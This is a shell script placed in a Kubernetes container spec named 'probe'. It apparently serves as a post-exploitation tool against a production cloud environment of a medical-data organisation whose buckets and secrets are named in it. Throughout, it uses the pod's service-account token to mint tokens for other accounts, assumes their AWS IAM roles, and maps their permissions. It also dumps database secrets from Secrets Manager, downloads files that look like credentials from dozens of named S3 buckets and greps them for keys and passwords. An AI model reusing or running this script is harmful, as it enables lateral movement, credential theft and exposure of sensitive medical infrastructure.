containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I3359_START env=prod utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq gzip >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(aws --version 2>&1 | head -c 60)"
export AWS_DEFAULT_REGION=us-west-2
CUR=""
assume(){
  NS=$1; S=$2; SESS=$3
  SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S")
  AR=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty')
  [ -z "$AR" ] && { echo "ROLE_NONE $NS/$S"; return 1; }
  TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$S/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && { echo "TOKEN_FAIL $NS/$S"; return 1; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$AR" --role-session-name "$SESS" --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $NS/$S $(echo "$RES"|head -c 160|tr "\n" " ")"; return 1; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES"|jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES"|jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES"|jq -r .Credentials.SessionToken)
  CUR="$NS/$S"; echo "ASSUME_OK $NS/$S role=$AR"; return 0
}
unassume(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; CUR=""; }

ALL=$(get "$API/api/v1/serviceaccounts")
echo "$ALL" | jq -r '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"] != null) | "\(.metadata.namespace) \(.metadata.name)"' > /tmp/sas.txt
echo "SA_TOTAL=$(wc -l < /tmp/sas.txt)"
cat /tmp/sas.txt

i=0
while read -r NS S; do
  i=$((i+1))
  if assume "$NS" "$S" "i3359a$i"; then
    echo "IDENT $NS/$S $(aws sts get-caller-identity --output json 2>&1 | tr "\n" " " | head -c 300)"
    RN=""
    SAJ=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$S")
    RN=$(echo "$SAJ" | jq -r '.metadata.annotations["eks.amazonaws.com/role-arn"] // empty' | awk -F/ '{print $NF}')
    if [ -n "$RN" ]; then
      echo "IAM_GETROLE $NS/$S $(aws iam get-role --role-name "$RN" --output json 2>&1 | head -c 900 | tr "\n" " ")"
      echo "IAM_ATTACHED $NS/$S $(aws iam list-attached-role-policies --role-name "$RN" --output json 2>&1 | head -c 900 | tr "\n" " ")"
      INL=$(aws iam list-role-policies --role-name "$RN" --output json 2>&1)
      echo "IAM_INLINE $NS/$S $(echo "$INL" | head -c 600 | tr "\n" " ")"
      PN=$(echo "$INL" | jq -r '.PolicyNames[0] // empty' 2>/dev/null)
      if [ -n "$PN" ]; then
        DOC=$(aws iam get-role-policy --role-name "$RN" --policy-name "$PN" --output json 2>&1)
        echo "IAM_DOC $NS/$S $(echo "$DOC" | jq -c '.PolicyDocument' 2>/dev/null | head -c 5000)"
        echo "$DOC" | grep -oE 'arn:aws:(secretsmanager|s3|sqs|sns|ses|kms|ecr|eks|logs|dynamodb|rds|cloudfront)[A-Za-z0-9/_+=.@,:-]*' | sort -u | head -40
      fi
    fi
    LB=$(aws s3api list-buckets --output json 2>&1)
    if echo "$LB" | jq -e '.Buckets' >/dev/null 2>&1; then echo "S3CAP_OK $NS/$S n=$(echo "$LB"|jq '.Buckets|length')"; echo "$LB" | jq -r '.Buckets[].Name' | head -60; else echo "S3CAP_NO $NS/$S $(echo "$LB"|head -c 140|tr "\n" " ")"; fi
    unassume
  fi
done < /tmp/sas.txt

# ---------- helper: try roles in order ----------
tryroles(){ # $1=label ; rest = roles "ns sa"
  LBL=$1; shift
  k=0
  for pair in "$@"; do
    k=$((k+1)); [ $k -gt 3 ] && break
    set -- $pair
    if assume "$1" "$2" "i3359t$LBL$k"; then
      echo "TRYROLE $LBL $1/$2"
      return 0
    fi
  done
  echo "TRYROLE_NONE $LBL"; return 1
}

# ---------- PHASE SM ----------
echo "###PHASE_SM"
for ARN in lazamedical-dp-prod01-usw2-postgresql-db-secret-m5h2GA lazamedical-dp-prod01-usw2-postgresql-db1-secret-N3ubHt; do
  OK=0
  for pair in "data-management-service data-management-sa s3-ingestion s3-ingestion-sa user-management-service user-management-sa authorization-service authorization-service-sa audit-log audit-log-sa de-identifier-service de-identifier-service-sa imfusion-service imfusion-service-sa metadata-extraction-service metadata-extraction-service-sa notification-service notification-service-sa"; do
    set -- $pair
    if assume "$1" "$2" "i3359sm"; then
      V=$(aws secretsmanager get-secret-value --secret-id "$ARN" --query SecretString --output text --region us-west-2 2>/tmp/smerr.txt)
      RC=$?
      if [ $RC -eq 0 ]; then echo "SM_OK $ARN role=$1/$2"; echo "SMVAL $V" | head -c 6000; echo; OK=1; else echo "SM_NO $ARN role=$1/$2 $(head -c 130 /tmp/smerr.txt|tr "\n" " ")"; fi
      unassume
    fi
    [ $OK -eq 1 ] && break
  done
done

# ---------- PHASE S3 ----------
echo "###PHASE_S3"
S3ROLE=""
for pair in "data-management-service data-management-sa s3-ingestion s3-ingestion-sa user-management-service user-management-sa authorization-service authorization-service-sa audit-log audit-log-sa de-identifier-service de-identifier-service-sa imfusion-service imfusion-service-sa metadata-extraction-service metadata-extraction-service-sa notification-service notification-service-sa"; do
  set -- $pair
  if assume "$1" "$2" "i3359s3cap"; then
    if aws s3api list-buckets --output json >/dev/null 2>&1; then S3ROLE="$1 $2"; echo "S3ROLE=$1/$2"; unassume; break; fi
    unassume
  fi
done
if [ -n "$S3ROLE" ]; then
  set -- $S3ROLE
  assume "$1" "$2" "i3359s3"
  : > /tmp/allkeys.txt
  for B in lazamedical-dp-prod01-usw2-airflow-bucket lazamedical-dp-prod01-usw2-athena-bucket lazamedical-dp-prod01-usw2-cornerstone-viewer-remote-ui-bucket lazamedical-dp-prod01-usw2-data-management-portal-ui-bucket lazamedical-dp-prod01-usw2-dicom-structure-bucket lazamedical-dp-prod01-usw2-glue-asset-bucket lazamedical-dp-prod01-usw2-glue-crawler-s3-bucket lazamedical-dp-prod01-usw2-green-bucket lazamedical-dp-prod01-usw2-imednet-sync-bucket lazamedical-dp-prod01-usw2-imfusion-bucket lazamedical-dp-prod01-usw2-imfusion-viewer-remote-ui-bucket lazamedical-dp-prod01-usw2-ingestion-bucket lazamedical-dp-prod01-usw2-ingestion-failure-bucket lazamedical-dp-prod01-usw2-lambda-code-s3-bucket lazamedical-dp-prod01-usw2-lps-bucket lazamedical-dp-prod01-usw2-metadata-parquet-bucket lazamedical-dp-prod01-usw2-mlflow-artifact-storage lazamedical-dp-prod01-usw2-png-viewer-remote-ui-bucket lazamedical-dp-prod01-usw2-red-bucket lazamedical-dp-prod01-usw2-rekognition-s3-bucket lazamedical-dp-prod01-usw2-temp-dicom-csv-reports-storage lazamedical-dp-prod01-usw2-temp-dicom-frame-storage lazamedical-dp-prod01-usw2-temp-storage-bucket-name lazamedical-dp-prod01-usw2-yellow-bucket lazamedical-prod01-usw2-bastion-bucket lazamedical-prod01-usw2-cloudtrail-01-logs lazamedical-prod01-usw2-cloudtrail-02-logs lazamedical-prod01-usw2-dp-ingestion-bucket lazamedical-prod01-usw2-s3-bucket lazamedical-prod01-usw2-user-management-ui-bucket; do
    LO=$(aws s3api list-objects-v2 --bucket "$B" --max-keys 100 --no-paginate --region us-west-2 --output json 2>/tmp/loerr.txt)
    RC=$?
    if echo "$LO" | jq -e '.Contents' >/dev/null 2>&1; then
      NN=$(echo "$LO"|jq '.Contents|length'); TR=$(echo "$LO"|jq -r '.IsTruncated')
      echo "BKT_OK $B n=$NN trunc=$TR"
      echo "$LO" | jq -r --arg b "$B" '.Contents[] | "\($b)\t\(.Size)\t\(.Key)"' >> /tmp/allkeys.txt
      echo "$LO" | jq -r '.Contents[].Key' | awk -F. 'NF>1{print $NF}' | sort | uniq -c | sort -rn | head -5 | tr "\n" ";" | sed "s/^/BKT_EXT $B /"
    else
      E=$(head -c 120 /tmp/loerr.txt | tr "\n" " ")
      if echo "$E" | grep -qi "NoSuchBucket"; then echo "BKT_NX $B"; else echo "BKT_NO $B $E"; fi
    fi
  done
  echo "BKT_KEYS_TOTAL=$(wc -l < /tmp/allkeys.txt)"
  # pick small candidate objects, <=3 per bucket, total <=30, <=20MB
  awk -F'\t' 'tolower($3) ~ /(\.env|config|secret|credential|key|backup|\.pem|\.json|\.ya?ml|\.ini|\.conf|\.tfstate|\.sql)/ && $2<1048576 {print}' /tmp/allkeys.txt | sort -t$'\t' -k2,2n > /tmp/cand.txt
  echo "CAND_N=$(wc -l < /tmp/cand.txt)"
  : > /tmp/picked.txt
  awk -F'\t' '!seen[$1]++ || seen[$1]<=3 {print}' /tmp/cand.txt | head -30 > /tmp/picked.txt
  IDX=0; TOT=0
  while IFS='	' read -r B SZ KEY; do
    IDX=$((IDX+1)); TOT=$((TOT+SZ))
    [ $TOT -gt 20971520 ] && { echo "CAP_BYTES"; break; }
    echo "PICK $IDX bucket=$B size=$SZ key=$KEY"
    aws s3api get-object --bucket "$B" --key "$KEY" /tmp/o$IDX.bin --region us-west-2 >/dev/null 2>/tmp/gerr.txt
    GRC=$?
    echo "GET rc=$GRC bytes=$(wc -c < /tmp/o$IDX.bin 2>/dev/null)"
    if [ $GRC -eq 0 ]; then
      if gzip -t /tmp/o$IDX.bin 2>/dev/null; then gzip -dc /tmp/o$IDX.bin > /tmp/o$IDX.txt 2>/dev/null; else cp /tmp/o$IDX.bin /tmp/o$IDX.txt; fi
      echo "SAMPLE $(head -c 200 /tmp/o$IDX.txt | tr "\n" " ")"
      H=$(grep -aEic "password|passwd|secret|token|AKIA|ASIA|Bearer|SMTP|api[_-]?key|sk-|Authorization|client_secret|PRIVATE KEY|connectionstring|mysql://|postgres://|redis://" /tmp/o$IDX.txt 2>/dev/null)
      echo "HITS=$H"
      grep -aEi "password|passwd|secret|token|AKIA|ASIA|Bearer|SMTP|api[_-]?key|sk-|Authorization|client_secret|PRIVATE KEY|connectionstring|mysql://|postgres://|redis://" /tmp/o$IDX.txt 2>/dev/null | head -6 | cut -c1-300
    else
      echo "GET_ERR $(head -c 140 /tmp/gerr.txt|tr "\n" " ")"
    fi
  done < /tmp/picked.txt
  unassume
fi

# ---------- PHASE SERVICES ----------
echo "###PHASE_SVC"
svc(){
  LBL=$1; shift
  k=0
  for pair in "data-management-service data-management-sa s3-ingestion s3-ingestion-sa user-management-service user-management-sa authorization-service authorization-service-sa audit-log audit-log-sa de-identifier-service de-identifier-service-sa imfusion-service imfusion-service-sa metadata-extraction-service metadata-extraction-service-sa notification-service notification-service-sa"; do
    k=$((k+1)); [ $k -gt 3 ] && break
    set -- $pair
    if assume "$1" "$2" "i3359v$LBL$k"; then
      OUT=$("$@" 2>&1); RC=$?
      echo "SVC_$LBL role=$1/$2 rc=$RC $(echo "$OUT" | head -c 1500 | tr "\n" " ")"
      unassume
      return 0
    fi
  done
  echo "SVC_$LBL NONE"
}
svc SQS aws sqs list-queues
svc SNS aws sns list-topics
svc SES aws ses get-send-quota
svc SESID aws ses list-identities --max-items 20
svc KMS aws kms list-keys --limit 20
svc KMSAL aws kms list-aliases --limit 20
svc ECR aws ecr describe-repositories --max-items 20
svc EKS aws eks list-clusters
svc LOGS aws logs describe-log-groups --limit 20
svc DDB aws dynamodb list-tables --limit 20
svc RDS aws rds describe-db-instances --max-items 5
svc RDSSNAP aws rds describe-db-snapshots --max-items 5
svc CF aws cloudfront list-public-keys --max-items 10
svc LAMBDA aws lambda list-functions --max-items 10
echo "===I3359_DONE $(date -u +%FT%TZ)==="
